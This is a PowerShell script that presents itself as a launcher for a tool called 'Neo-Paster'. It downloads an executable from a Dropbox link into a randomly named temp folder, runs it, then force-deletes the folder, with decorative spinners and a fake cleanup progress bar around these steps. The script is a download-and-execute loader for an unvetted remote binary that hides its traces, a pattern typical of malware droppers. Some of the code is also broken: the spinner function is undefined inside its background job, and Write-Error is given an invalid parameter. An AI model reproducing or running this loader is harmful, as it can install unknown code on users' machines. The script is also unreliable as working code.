$url = "https://www.dropbox.com/scl/fi/pywkslydef69f64ga6ukp/neopaster.exe?rlkey=yjfxi2hibb9bmdhe7acs94yu2&st=4xf7ng1c&dl=1"  
$tempdir = "$env:TEMP\$(New-Guid)" 
mkdir $tempdir | Out-Null
$file = "$tempdir\app.exe" 

# Simulate download start
Write-Host "Download started..." -ForegroundColor Cyan
Start-Sleep -Seconds 1  # Simulate the downloading animation

# Show spinner in the background while downloading
$spinnerJob = Start-Job -ScriptBlock { Show-Spinner }

try {
    # Suppress the output from the web request
    irm -Uri $url -OutFile $file -ErrorAction Stop 4>&1 | Out-Null
    Stop-Job $spinnerJob
    Write-Host "`rDownload complete!" -ForegroundColor Green
    Start-Sleep -Seconds 1  # Simulate download completion

    # Neo-Paster loading animation
    Write-Host "Neo-Paster is loading..." -ForegroundColor Yellow
    Start-Sleep -Seconds 2  # Simulate loading time

    # Start the process (Neo-Paster)
    $proc = Start-Process $file -PassThru -Wait 
    Write-Host "Process exited with code: $($proc.ExitCode)" -ForegroundColor Green

} catch {
    Write-Error "An error occurred: $_" -ForegroundColor Red
} finally {
    # Simulate cleanup process with progress bar
    Write-Host "Cleaning up temporary files..." -ForegroundColor Magenta
    Start-Sleep -Seconds 1  # Simulate cleanup process

    # Progress bar for cleanup
    $progress = 0
    while ($progress -le 100) {
        Write-Progress -PercentComplete $progress -Status "Cleaning up" -Activity "Please wait..."
        Start-Sleep -Milliseconds 100
        $progress += 5
    }

    ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue  
    Write-Host "Temporary files removed. Have a nice day!" -ForegroundColor Blue
}

# Loading Spinner function
function Show-Spinner {
    $spinner = @('/','-','\','|')
    $i = 0
    while ($true) {
        Write-Host -NoNewline "$($spinner[$i])"
        Start-Sleep -Milliseconds 200
        Write-Host -NoNewline "`r"
        $i = ($i + 1) % $spinner.Length
    }
}
